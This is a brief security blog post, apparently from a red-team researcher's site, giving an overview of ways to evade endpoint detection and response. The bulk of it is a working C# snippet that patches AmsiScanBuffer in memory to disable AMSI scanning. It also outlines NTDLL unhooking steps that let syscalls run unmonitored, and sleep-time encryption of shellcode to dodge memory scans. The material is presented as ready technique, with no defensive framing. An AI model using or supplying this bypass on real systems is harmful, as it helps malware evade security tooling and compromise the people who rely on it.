---
TitleSEO:    "EDR Evasion Techniques Overview | ZureFX"
TitlePost:   "EDR Evasion Techniques Overview"
Author:      "ZureFX"
Description: "Overview of common EDR evasion techniques: syscall unhooking, AMSI bypass, process injection and sleep obfuscation."
Keywords:    "edr evasion, amsi bypass, syscall, process injection, red team, malware"
URL:         "https://zurefx.github.io/research/edr-evasion-research.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/research/edr-evasion-research/"
Date:        "2026-03-15"
Tags:        "Research, RedTeam, EDR, Evasion, AMSI"
Section:     "research"
Lang:        "en"
main_img:    "edr-evasion-research"
Permalink:   "/research/edr-evasion-research.html"
BtnLabel:    "Read Research"
---

## AMSI Bypass

```csharp
// Patch AmsiScanBuffer in memory
var amsi = LoadLibrary("amsi.dll");
var scanBuf = GetProcAddress(amsi, "AmsiScanBuffer");
VirtualProtect(scanBuf, 5, 0x40, out _);
Marshal.Copy(new byte[]{ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, scanBuf, 6);
```

## Syscall Unhooking

EDRs hook NTDLL functions. Unhooking = re-reading clean copy from disk.

```
1. Map fresh NTDLL from disk
2. Copy .text section over hooked version
3. Direct syscalls execute unmonitored
```

## Sleep Obfuscation

Encrypt shellcode in memory while sleeping, decrypt before execution — avoids memory scans.
